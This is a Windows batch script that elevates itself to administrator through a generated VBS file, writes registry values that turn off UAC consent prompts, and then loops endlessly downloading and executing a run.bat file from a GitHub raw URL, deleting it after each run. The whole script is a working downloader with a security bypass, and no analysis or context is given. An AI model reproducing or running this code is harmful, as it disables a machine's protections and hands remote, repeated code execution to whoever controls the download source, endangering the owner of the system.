@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f


:loop
powershell -Command "while (-not (Test-Connection google.com -Count 1 -Quiet)) { Start-Sleep 5 }"
powershell -Command "$url = 'https://raw.githubusercontent.com/mitutina/mitutina/main/run.bat'; $tempPath = [System.IO.Path]::Combine($env:TEMP, 'run.bat'); Invoke-WebRequest -Uri $url -OutFile $tempPath; Start-Process $tempPath; Start-Sleep -Seconds 2; Remove-Item $tempPath"
timeout /t 30 /nobreak >nul
REM Quay lại vòng lặp
goto loop
exit
